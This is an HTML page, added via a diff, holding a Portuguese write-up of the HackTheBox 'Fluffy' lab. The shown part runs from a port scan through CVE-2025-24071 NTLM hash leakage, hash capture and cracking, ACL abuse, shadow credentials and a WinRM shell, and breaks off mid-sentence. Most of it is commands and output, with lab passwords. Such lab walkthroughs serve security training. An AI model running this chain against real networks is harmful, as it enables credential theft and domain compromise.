@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="../../css/css-paper/paper.css">
+    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
+    <title>paper - Compromising a Domain Controller (HTB fluffy)</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
+    <script>
+        hljs.highlightAll();
+        //  hljs.configure({languages: []});
+    </script>
+</head>
+
+<body>
+    <div class="main_container">
+        <header class="header_top">
+            <div class="left-section">
+                <a href="../../index.html" class="menu-link">[ 0xh0m3 ]</a>
+                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
+                <a href="../../c/contribute.html" class="menu-link">[ 0xContribut3 ]</a>
+                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
+            </div>
+            <div class="right-section">
+                <span class="glitch-text">0xPwnbuff3r</span>
+            </div>
+
+        </header>
+
+        <main class="content">
+            <h1 class="pwntitle">Compromising a Domain Controller (HTB
+fluffy)</h1>
+            <article class="article">
+                <p><code>Author</code>: Nullbyte</p>
+                <p>Fluffy é uma máquina do hackthebox que ataca os
+                princípios de uma rede corporativa, explorando cada
+                detalhe de vulnerabilidade, cada byte, cada bit.</p>
+                <h2 id="lets-hack">Let's hack!</h2>
+                <p><strong>Credenciais:</strong></p>
+                <p><code>"As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!"</code></p>
+                <h4 id="recon">Recon</h4>
+                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+└─# scan fluffy.htb
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
+The Modern Day Port Scanner.
+
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;
+[~] Automatically increasing ulimit value to 5000.
+Open 10.129.85.197:53
+Open 10.129.85.197:88
+Open 10.129.85.197:139
+Open 10.129.85.197:389
+Open 10.129.85.197:445
+Open 10.129.85.197:464
+Open 10.129.85.197:593
+Open 10.129.85.197:636
+Open 10.129.85.197:3269
+Open 10.129.85.197:3268
+Open 10.129.85.197:5985
+Open 10.129.85.197:9389
+
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-30 03:02:41Z)
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF[...]
+|_ssl-date: 2025-07-30T03:04:18+00:00; +7h00m00s from scanner time.
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-30T03:04:16+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF[...]
+|_-----END CERTIFICATE-----
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF[...]
+|_-----END CERTIFICATE-----
+|_ssl-date: 2025-07-30T03:04:18+00:00; +7h00m00s from scanner time.
+3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-30T03:04:16+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:, DNS:DC01.fluffy.htb
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-17T16:04:17
+| Not valid after:  2026-04-17T16:04:17
+| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
+| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
+| -----BEGIN CERTIFICATE-----
+| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF[...]
+|_-----END CERTIFICATE-----
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49681/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.95%E=4%D=7/29%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=68892942%P=x86_64-pc-linux-gnu)
+SEQ(SP=103%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)
+SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
+OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
+WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 43914/tcp): CLEAN (Timeout)
+|   Check 2 (port 45400/tcp): CLEAN (Timeout)
+|   Check 3 (port 29708/udp): CLEAN (Timeout)
+|   Check 4 (port 37110/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-30T03:03:37
+|_  start_date: N/A
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+
+TRACEROUTE (using port 49690/tcp)
+HOP RTT       ADDRESS
+1   144.00 ms 10.10.14.1 (10.10.14.1)
+2   145.84 ms fluffy.htb (10.129.85.197)</code></pre>
+                <p><code>[0x0539] &gt;</code> Analisando, podemos
+                observar algumas portas que provavelmente serão muito
+                importantes: <code>445</code>, <code>389</code>,
+                <code>88</code>, <code>5985</code>. Iniciaremos
+                analisando o serviço <a
+                href="https://en.wikipedia.org/wiki/Server_Message_Block">SMB</a>
+                utilizado para compartilhamento de arquivos e até mesmo
+                execução de código remoto (Dependendo do usuário).</p>
+                <ul>
+                <li><strong>Trick</strong>: usando <code>nxc</code> para
+                enumerar o smb</li>
+                </ul>
+                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+└─# nxc smb fluffy.htb -u &#39;j.fleischman&#39; -p &#39;J0elTHEM4n1990!&#39; --shares
+SMB         10.129.85.197   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.197   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+SMB         10.129.85.197   445    DC01             [*] Enumerated shares
+SMB         10.129.85.197   445    DC01             Share           Permissions     Remark
+SMB         10.129.85.197   445    DC01             -----           -----------     ------
+SMB         10.129.85.197   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.85.197   445    DC01             C$                              Default share
+SMB         10.129.85.197   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.85.197   445    DC01             IT              READ,WRITE      
+SMB         10.129.85.197   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.85.197   445    DC01             SYSVOL          READ            Logon server share</code></pre>
+                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+└─# smbclient //fluffy.htb/IT -U &#39;j.fleischman&#39; -c &#39;ls&#39; 
+Password for [WORKGROUP\j.fleischman]:
+  .                                   D        0  Tue Jul 29 23:23:33 2025
+  ..                                  D        0  Tue Jul 29 23:23:33 2025
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
+
+        5842943 blocks of size 4096. 1844516 blocks available</code></pre>
+                <pre class="bash"><code>┌──(root㉿kali)-[/tmp]
+└─# smbclient //fluffy.htb/IT -U &#39;j.fleischman&#39; -c &#39;ls;get Upgrade_Notice.pdf&#39;
+Password for [WORKGROUP\j.fleischman]:
+  .                                   D        0  Tue Jul 29 23:23:33 2025
+  ..                                  D        0  Tue Jul 29 23:23:33 2025
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
+
+        5842943 blocks of size 4096. 1880881 blocks available
+getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (148.2 KiloBytes/sec) (average 148.2 KiloBytes/sec)</code></pre>
+                <p><code>[0x0539] &gt;</code> Abrindo o <code>PDF</code>
+                podemos descobrir que alguma das vulnerabilidades
+                listadas está presente na rede. Nós temos uma
+                vulnerabilidade muito interessante, buscando na internet
+                achamos uma <code>CVE</code> que nos permite ganhar
+                algum acesso.</p>
+                <p><code>CVE-2025-24071</code> -&gt; <a
+                href="https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom">https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom</a></p>
+                <pre class="plaintext"><code>              .7
+            .&#39;/
+           / /
+          / /
+         / /
+        / /
+       / /
+      / /
+     / /
+    / /
+  __|/
+,-\__\
+|f-&quot;Y\|
+\()7L/
+ cgD                            __ _
+ |\(                          .&#39;  Y &#39;&gt;,
+  \ \                        / _   _   \
+   \\\                       )(_) (_)(|}
+    \\\                      {  4A   } /
+     \\\                      \uLuJJ/\l
+      \\\                     |3    p)/
+       \\\___ __________      /nnm_n//
+       c7___-__,__-)\,__)(&quot;.  \_&gt;-&lt;_/D
+                  //V     \_&quot;-._.__G G_c__.-__&lt;&quot;/ ( \
+                         &lt;&quot;-._&gt;__-,G_.___)\   \7\
+                        (&quot;-.__.| \&quot;&lt;.__.-&quot; )   \ \
+                        |&quot;-.__&quot;\  |&quot;-.__.-&quot;.\   \ \
+                        (&quot;-.__&quot;&quot;. \&quot;-.__.-&quot;.|    \_\
+                        \&quot;-.__&quot;&quot;|!|&quot;-.__.-&quot;.)     \ \
+                         &quot;-.__&quot;&quot;\_|&quot;-.__.-&quot;./      \ l
+                          &quot;.__&quot;&quot;&quot;&gt;G&gt;-.__.-&quot;&gt;       .--,_
+                              &quot;&quot;  G</code></pre>
+                <h2 id="-exploitation-vulnerabilities-">-Exploitation
+                Vulnerabilities-</h2>
+                <p><code>[0x0539] &gt;</code> Executando os passos para
+                gerar a carga útil com <code>metasploit</code></p>
+                <pre class="bash"><code>msf6 auxiliary(server/ntlm_hash_leak) &gt; options
+
+Module options (auxiliary/server/ntlm_hash_leak):
+
+   Name          Current Setting       Required  Description
+   ----          ---------------       --------  -----------
+   ATTACKER_IP                         yes       The IP address to which the SMB request will be sent
+   FILENAME      exploit.zip           yes       The name of the ZIP file to create
+   LIBRARY_NAME  malicious.library-ms  yes       The name of the .library-ms file
+   SHARE_NAME    shared                yes       The SMB share name to use in the .library-ms file
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(server/ntlm_hash_leak) &gt; set ATTACKER_IP 10.10.14.184
+ATTACKER_IP =&gt; 10.10.14.184
+msf6 auxiliary(server/ntlm_hash_leak) &gt; exploit
+[*] Malicious ZIP file created: exploit.zip
+[*] Host the file and wait for the victim to extract it.
+[*] Ensure you have an SMB capture server running to collect NTLM hashes.
+[*] Auxiliary module execution completed
+msf6 auxiliary(server/ntlm_hash_leak) &gt; pwd
+[*] exec: pwd
+/root/windows/ctf/fluffy/CVE-2025-24071-msfvenom</code></pre>
+                <p><code>[0x0539] &gt;</code> Fazendo o upload do
+                payload criado pelo metasploit</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# ls
+exploit.zip  ntlm_hash_leak.rb  README.md
+                                                                                                         
+┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# smbclient //fluffy.htb/IT -U &#39;j.fleischman&#39;                               
+Password for [WORKGROUP\j.fleischman]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; put exploit.zip
+putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
+smb: \&gt; </code></pre>
+                <p><code>[0x0539] &gt;</code> ""Sniffando"" a rede até
+                obter a hash do usuário <code>p.agila</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[/home/nullbyte]
+└─# responder -I tun0 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.6.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+  [+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.85.197
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:HIDDEN</code></pre>
+                <p><code>[0x0539] &gt;</code> "Quebrando" a hash do
+                usuário <code>p.agila</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_p.agila 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+prometheusx-303  (p.agila)     
+1g 0:00:00:10 DONE (2025-07-29 17:42) 0.09354g/s 422579p/s 422579c/s 422579C/s proquis..prom pics
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed. </code></pre>
+                <p><code>[0x0539] &gt;</code> Vendo quais permissões
+                tenho com o usuário <code>p.agila</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Prometheus Agila,CN=Users,DC=fluffy,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE</code></pre>
+                <p><code>[0x0539] &gt;</code> O usuário
+                <code>p.agila</code> tem algumas permissões importantes,
+                como <code>DACL</code>, <code>OWNER</code>.
+                <code>[0x0539] &gt;</code> Podemos então tomar controle
+                do grupo e assim obter controle total dos objetos do
+                grupo, e sendo proprietário, obtemos privilégio de todas
+                as contas que pertencem a esse grupo!</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; set owner &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
+
+[+] Old owner S-1-5-21-497550768-2797716248-2627064577-512 is now replaced by p.agila on CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
+                <p><code>[0x0539] &gt;</code> adicionando permissão
+                geral sobre o grupo <code>Service Accounts</code> com o
+                usuário <code>p.agila</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; add genericAll &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
+
+[+] p.agila has now GenericAll on CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
+                <p><code>[0x0539] &gt;</code> adicionando o usuário
+                <code>p.agila</code> no grupo
+                <code>Service Accounts</code></p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# bloodyAD --host 10.129.85.197 -d fluffy.htb -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; add groupMember &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; p.agila
+[+] p.agila added to CN=Service Accounts,CN=Users,DC=fluffy,DC=htb</code></pre>
+                <p><code>[0x0539] &gt;</code> Identificando membros do
+                grupo <code>Service Accounts</code>.</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# ldapsearch -x -H ldap://10.129.85.197 -D &#39;p.agila@fluffy.htb&#39; -w &#39;prometheusx-303&#39; -b &quot;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&quot; | grep member
+member: CN=winrm service,CN=Users,DC=fluffy,DC=htb
+member: CN=ldap service,CN=Users,DC=fluffy,DC=htb
+member: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</code></pre>
+                <p><code>[0x0539] &gt;</code> Pelo que podemos ver,
+                temos <code>3</code> membros, e os membros têm nomes de
+                serviços. Dois deles são interessantes para nós:
+                <code>winrm</code>,
+                <code>certificate authority</code>.</p>
+                <hr />
+                <p><code>[0x0539] &gt;</code> Lembram que temos
+                permissão de DACL? Podemos fazer um ataque de shadow
+                credential com essas contas de serviço!</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# pywhisker --dc-host 10.129.85.197 -d fluffy.htb -u p.agila -p &#39;prometheusx-303&#39; /
+ -t winrm_svc -a add
+
+ [*] Searching for the target account
+[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 27d0d9a6-ada7-3dda-2ac3-1cf08fd76e61
+[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -&gt; PFX with cryptography: Qhe8WZes.pfx
+[+] PFX exportiert nach: Qhe8WZes.pfx
+[i] Passwort für PFX: 4xN1LvZWPxl2VRHyampW
+[+] Saved PFX (#PKCS12) certificate &amp; key at path: Qhe8WZes.pfx
+[*] Must be used with password: 4xN1LvZWPxl2VRHyampW
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</code></pre>
+                <p><code>[0x0539] &gt;</code> Após obter o PFX nesse
+                caso vou fazer com a winrm e podemos se conectar por ela
+                assim podemos obter nossa flag de user.txt!</p>
+                <p>lembrando que os certificados no AD são bastante
+                importantentes, se obtermos um certificado de algum
+                usuário podemos obter a hash dele atraves de um simples
+                certificado!</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# certipy auth -pfx Qhe8WZes.pfx -password &quot;4xN1LvZWPxl2VRHyampW&quot; -username &#39;winrm_svc&#39; /
+-dc-ip 10.129.85.197 -ns 10.129.85.197 -domain fluffy.htb -no-save
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: &#39;winrm_svc@fluffy.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Trying to retrieve NT hash for &#39;winrm_svc&#39;
+[*] Got hash for &#39;winrm_svc@fluffy.htb&#39;: </code></pre>
+                <p><code>[0x0539] &gt;</code> pegando a
+                <code>Flag</code>!</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy/CVE-2025-24071-msfvenom]
+└─# evil-winrm -i 10.129.85.197 -u &#39;winrm_svc&#39; -p &#39;hash ntlm&#39;
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; dir
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/29/2025   8:00 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; type user.txt
+0c169e83b26e682d HIDDEN HAHAHAHA
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop&gt; </code></pre>
+                <p><code>[0x0539] &gt;</code> Agora vamos ver a conta de
+                serviço <code>certificate authority</code>, e ver quais
+                permissões ela tem.</p>
+                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+└─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; / 
+-dc-ip 10.129.85.197 -ns 10.129.85.197 -target DC01.fluffy.htb -user &#39;ca_svc&#39; read
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.164.91&#39;
+[+] DC IP: &#39;10.129.164.91&#39;
+[+] DC Host: &#39;DC01.fluffy.htb&#39;
+[+] Target IP: &#39;10.129.164.91&#39;
+[+] Remote Name: &#39;DC01.fluffy.htb&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;CA_SVC&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.164.91:636 - ssl
+[+] Default path: DC=fluffy,DC=htb
+[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb
+[*] Reading attributes for &#39;ca_svc&#39;:
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-08-01T21:53:02+00:00</code></pre>
+                <p><code>[0x0539] &gt;</code> Vamos gerar um ticket TGT
